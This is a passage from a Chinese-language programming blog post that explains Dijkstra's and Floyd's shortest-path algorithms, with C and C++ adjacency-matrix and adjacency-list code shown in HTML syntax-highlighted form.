function_">firstadj</span><span class="params">(<span class="type">int</span> v)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">nextadj</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Dijkstra</span><span class="params">(VertexType start_point)</span>;<span class="comment">//使用迪杰斯特拉算法打印单源最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show</span><span class="params">()</span>;<span class="comment">//调试用，打印邻接矩阵</span></span><br><span class="line">private:</span><br><span class="line">VertexType vexs[MVNum];<span class="comment">//顶点表,将顶点保存的信息存入此处</span></span><br><span class="line">ArcType arcs[MVNum][MVNum];<span class="comment">//邻接矩阵</span></span><br><span class="line"><span class="type">int</span> vexnum, arcnum;<span class="comment">//图当前的顶点数和边数</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">queue</span>&lt;VertexType&gt;&gt;path;<span class="comment">//保存各结点最短路径的path[i]</span></span><br><span class="line">ArcType dist[MVNum];<span class="comment">//最短路径大小</span></span><br><span class="line"><span class="type">bool</span> solved[MVNum];<span class="comment">//是否找到最短路径</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Graph::LocateVex</span><span class="params">(VertexType u)</span></span><br><span class="line">&#123;<span class="comment">//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (u == this-&gt;vexs[i])</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Graph::firstadj</span><span class="params">(<span class="type">int</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;arcs[v][i] != MAX)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Graph::nextadj</span><span class="params">(<span class="type">int</span> v, <span class="type">int</span> w)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = w + <span class="number">1</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;arcs[v][i] != MAX)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Graph::Show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; this-&gt;vexnum; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setw(<span class="number">4</span>) &lt;&lt; this-&gt;arcs[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Graph::Create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入总结点数和总边数:&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; this-&gt;vexnum &gt;&gt; this-&gt;arcnum;<span class="comment">//输入总顶点数和总边数</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入各结点的信息:&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; this-&gt;vexs[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化邻接矩阵</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; this-&gt;vexnum; j++)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;arcs[i][j] = MAX;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//构造邻接矩阵</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;arcnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v1, v2, w;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;条边的起点和终点及其对应的权值:&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w;</span><br><span class="line"><span class="type">int</span> m = LocateVex(v1);</span><br><span class="line"><span class="type">int</span> n = LocateVex(v2);</span><br><span class="line">this-&gt;arcs[m][n] = w;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Graph::Dijkstra</span><span class="params">(VertexType start_point)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//初始化最短距离数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">this-&gt;dist[i] = MAX;</span><br><span class="line">&#125;</span><br><span class="line">dist[this-&gt;LocateVex(start_point)] = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//初始化保存路径的向量</span></span><br><span class="line"><span class="built_in">queue</span>&lt;VertexType&gt;temp;</span><br><span class="line">temp.push(start_point);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//（移到for外）queue&lt;VertexType&gt;temp;</span></span><br><span class="line"><span class="comment">//temp.push(start_point);</span></span><br><span class="line">path.push_back(temp);</span><br><span class="line"><span class="comment">//（不可行）path[i].push(start_point);//将起点作为最初始的路径加入每个结点对应的队列中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化solved数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line">solved[i] = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (this-&gt;arcs[this-&gt;LocateVex(start_point)][i] != MAX)</span><br><span class="line">&#123;</span><br><span class="line">dist[i] = this-&gt;arcs[this-&gt;LocateVex(start_point)][i];</span><br><span class="line">path[i].push(this-&gt;vexs[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">solved[this-&gt;LocateVex(start_point)] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;<span class="comment">//返回地找</span></span><br><span class="line">ArcType mind = MAX;</span><br><span class="line"><span class="type">int</span> v = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; this-&gt;vexnum; j++)</span><br><span class="line">&#123;<span class="comment">//一个劲地往前走</span></span><br><span class="line"><span class="comment">//（移出for）int v = i;</span></span><br><span class="line"><span class="keyword">if</span> (!solved[j] &amp;&amp; dist[j] &lt; mind)</span><br><span class="line">&#123;</span><br><span class="line">mind = dist[j];</span><br><span class="line">v = j;</span><br><span class="line">&#125;</span><br><span class="line">solved[v] = <span class="literal">true</span>;</span><br><span class="line"><span class="type">int</span> w = this-&gt;firstadj(v);</span><br><span class="line"><span class="keyword">while</span> (w != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dist[v] + this-&gt;arcs[v][w] &lt; dist[w])</span><br><span class="line">&#123;</span><br><span class="line">dist[w] = dist[v] + this-&gt;arcs[v][w];</span><br><span class="line">path[w] = path[v];</span><br><span class="line">path[w].push(vexs[w]);</span><br><span class="line">&#125;</span><br><span class="line">w = this-&gt;nextadj(v, w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;从结点&quot;</span> &lt;&lt; start_point &lt;&lt; <span class="string">&quot;开始到各点的最短路径和路径长度如下:&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; this-&gt;vexnum; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (dist[i] == MAX)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无法到达结点&quot;</span> &lt;&lt; this-&gt;vexs[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;抵达结点&quot;</span> &lt;&lt; this-&gt;vexs[i] &lt;&lt; <span class="string">&quot;的最短路径:&quot;</span>;</span><br><span class="line"><span class="type">int</span> path_length = path[i].size();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; path_length; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; path[i].front() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">path[i].pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;长度为&quot;</span> &lt;&lt; dist[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">Graph s;</span><br><span class="line">s.Create();</span><br><span class="line">s.Show();</span><br><span class="line">VertexType start_point;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入起点:&quot;</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; start_point;</span><br><span class="line">s.Dijkstra(start_point);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果:<br><img src="https://img-blog.csdnimg.cn/6a74f76cf3a942d0a2681598f8e880b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><a href="https://blog.csdn.net/qq_51462776/article/details/122148218?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164448321716780269836468%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164448321716780269836468&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-18-122148218.first_rank_v2_pc_rank_v29&amp;utm_term=%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95c%2B%2B&amp;spm=1018.2226.3001.4187">参考文章</a></p><h3 id="邻接表实现"><a class="markdownIt-Anchor" href="#邻接表实现">#</a> 邻接表实现</h3><p>待定</p><h2 id="floyd算法求多源最短路径问题"><a class="markdownIt-Anchor" href="#floyd算法求多源最短路径问题">#</a> Floyd 算法 (求多源最短路径问题)</h2><h3 id="算法思想"><a class="markdownIt-Anchor" href="#算法思想">#</a> 算法思想</h3><p><img src="https://img-blog.csdnimg.cn/e6693483ab424a109ca5d2cc67e3fa56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/7696568b305543b9935afc3b82d6c1d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWTFzZWNv,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>概括为迭代更新 i 经由 k 到 j 的最短路径.</p><h3 id="算法原理-2"><a class="markdownIt-Anchor" href="#算法原理-2">#</a> 算法原理</h3><ol><li>从任意一条单边路径开始。所有两点之间的距离是边的权，如果两点之间没有边相连，则权为无穷大。</li><li>对于每一对顶点 u 和 v，看看是否存在一个顶点 w 使得从 u 到 w 再到 v 比已知的路径更短。如果是更新它。</li><li>把图用邻接矩阵 G 表示出来，如果从 Vi 到 Vj 有路可达，则 G [i][j]=d，d 表示该路的长度；否则 G [i][j]= 无穷大。定义一个矩阵 D 用来记录所插入点的信息，D [i][j] 表示从 Vi 到 Vj 需要经过的点，初始化 D [i][j]=j。把各个顶点插入图中，比较插点后的距离与原来的距离，G [i][j]= min ( G [i][j], G [i][k]+G [k][j] )，如果 G [i][j] 的值变小，则 D [i][j]=k。在 G 中包含有两点之间最短道路的信息，而在 D 中则包含了最短通路径的信息。</li><li>比如，要寻找从 V5 到 V1 的路径。根据 D，假如 D (5,1)=3 则说明从 V5 到 V1 经过 V3，路径为 {V5,V3,V1}，如果 D (5,3)=3，说明 V5 与 V3 直接相连，如果 D (3,1)=1，说明 V3 与 V1 直接相连。</li></ol><h3 id="邻接矩阵实现-2"><a class="markdownIt-Anchor" href="#邻接矩阵实现-2">#</a> 邻接矩阵实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXV 7<span class="comment">//最大顶点个数 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 32767<span class="comment">//定义 ∞</span></span></span><br><span class="line"><span class="comment">//∞ == 32767 ,int 型的最大范围（2位）= 2^(2*8-1)，TC告诉我们int占用2个字节，而VC和LGCC告诉我们int占用4个字节</span></span><br><span class="line"><span class="comment">//图：Graph</span></span><br><span class="line"><span class="comment">//顶点：Vertex</span></span><br><span class="line"><span class="comment">//邻接：Adjacency</span></span><br><span class="line"><span class="comment">//矩阵：Matrix</span></span><br><span class="line"><span class="comment">//表：List</span></span><br><span class="line"><span class="comment">//边：Edge </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vertex</span> &#123;</span></span><br><span class="line"><span class="type">int</span> number;<span class="comment">//顶点的编号 </span></span><br><span class="line">&#125;VertexType; <span class="comment">//别名，顶点的类型 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">matrix</span> &#123;</span></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//顶点个数</span></span><br><span class="line"><span class="type">int</span> e;<span class="comment">//边数 </span></span><br><span class="line"><span class="type">int</span> adjMat[MAXV][MAXV];<span class="comment">//邻接矩阵数组</span></span><br><span class="line">VertexType ver[MAXV];<span class="comment">//存放顶点信息 </span></span><br><span class="line">&#125;MatGraph;<span class="comment">//别名，完整的图邻接矩阵类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">eNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> adjVer;<span class="comment">//该边的邻接点编号 </span></span><br><span class="line"><span class="type">int</span> weiLGht;<span class="comment">//该边的的信息，如权值 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eNode</span>* <span class="title">nextEdLGe</span>;</span><span class="comment">//指向下一条边的指针 </span></span><br><span class="line">&#125;EdgeNode; <span class="comment">//别名，边结点的类型 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vNode</span> &#123;</span></span><br><span class="line">EdgeNode* firstEdLGe;<span class="comment">//指向第一个边结点 </span></span><br><span class="line">&#125;VNode; <span class="comment">//别名，邻接表的头结点类型 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span> &#123;</span></span><br><span class="line"><span class="type">int</span> n;<span class="comment">//顶点个数</span></span><br><span class="line"><span class="type">int</span> e;<span class="comment">//边数</span></span><br><span class="line">VNode adjList[MAXV];<span class="comment">//邻接表的头结点数组 </span></span><br><span class="line">&#125;ListGraph;<span class="comment">//别名，完整的图邻接表类型 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建图的邻接表 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">createAdjListGraph</span><span class="params">(ListGraph*&amp; LG, <span class="type">int</span> A[MAXV][MAXV], <span class="type">int</span> n, <span class="type">int</span> e)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">EdgeNode* p;</span><br><span class="line">LG = (ListGraph*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ListGraph));</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">LG-&gt;adjList[i].firstEdLGe = <span class="literal">NULL</span>;<span class="comment">//给邻接表中所有头结点指针域置初值 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;<span class="comment">//检查邻接矩阵中的每个元素 </span></span><br><span class="line"><span class="keyword">for</span> (j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line"><span class="keyword">if</span> (A[i][j] != <span class="number">0</span>) &#123;<span class="comment">//存在一条边 </span></span><br><span class="line">p = (EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));<span class="comment">//申请一个结点内存</span></span><br><span class="line">p-&gt;adjVer = j;<span class="comment">//存放邻接点 </span></span><br><span class="line">p-&gt;weiLGht = A[i][j];<span class="comment">//存放权值</span></span><br><span class="line">p-&gt;nextEdLGe = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;nextEdLGe = LG-&gt;adjList[i].firstEdLGe;<span class="comment">//头插法 </span></span><br><span class="line">LG-&gt;adjList[i].firstEdLGe = p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">LG-&gt;n = n;</span><br><span class="line">LG-&gt;e = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出邻接表 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayAdjList</span><span class="params">(ListGraph* LG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">EdgeNode* p;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXV; i++) &#123;</span><br><span class="line">p = LG-&gt;adjList[i].firstEdLGe;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d:&quot;</span>, i);</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;weiLGht != <span class="number">32767</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2d[%d]-&gt;&quot;</span>, p-&gt;adjVer, p-&gt;weiLGht);</span><br><span class="line">&#125;</span><br><span class="line">p = p-&gt;nextEdLGe;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出邻接矩阵</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayAdjMat</span><span class="params">(MatGraph MG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXV; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MAXV; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (MG.adjMat[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4s&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (MG.adjMat[i][j] == <span class="number">32767</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4s&quot;</span>, <span class="string">&quot;∞&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d&quot;</span>, MG.adjMat[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表转换为邻接矩阵</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ListToMat</span><span class="params">(ListGraph* LG, MatGraph&amp; MG)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">EdgeNode* p;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXV; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MAXV; j++) &#123;</span><br><span class="line">MG.adjMat[i][j] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LG-&gt;n; i++) &#123;</span><br><span class="line">p = LG-&gt;adjList[i].firstEdLGe;</span><br><span class="line"><span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">MG.adjMat[i][p-&gt;adjVer] = p-&gt;weiLGht;</span><br><span class="line">p = p-&gt;nextEdLGe;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">MG.n = LG-&gt;n;</span><br><span class="line">MG.e = LG-&gt;e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出多源最短路径</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">displayPath</span><span class="params">(MatGraph MG, <span class="type">int</span> A[MAXV][MAXV], <span class="type">int</span> path[MAXV][MAXV])</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j, k;</span><br><span class="line"><span class="type">int</span> s;</span><br><span class="line"><span class="type">int</span> aPath[MAXV];<span class="comment">//存放一条最短路径（逆向）</span></span><br><span class="line"><span class="type">int</span> d;<span class="comment">//顶点个数</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MG.n; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; MG.n; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (A[i][j] != INF &amp;&amp; i != j) &#123;<span class="comment">//若顶点 i 和 顶点 j 之间存在路径</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;从 %d 到 %d 的路径为：&quot;</span>, i, j);</span><br><span class="line">k = path[i][j];</span><br><span class="line">d = <span class="number">0</span>;</span><br><span class="line">aPath[d] = j;<span class="comment">//路径上添加终点</span></span><br><span class="line"><span class="keyword">while</span> (k != <span class="number">-1</span> &amp;&amp; k != i) &#123;<span class="comment">//路劲上添加中间点</span></span><br><span class="line">d++;</span><br><span class="line">aPath[d] = k;</span><br><span class="line">k = path[i][k];</span><br><span 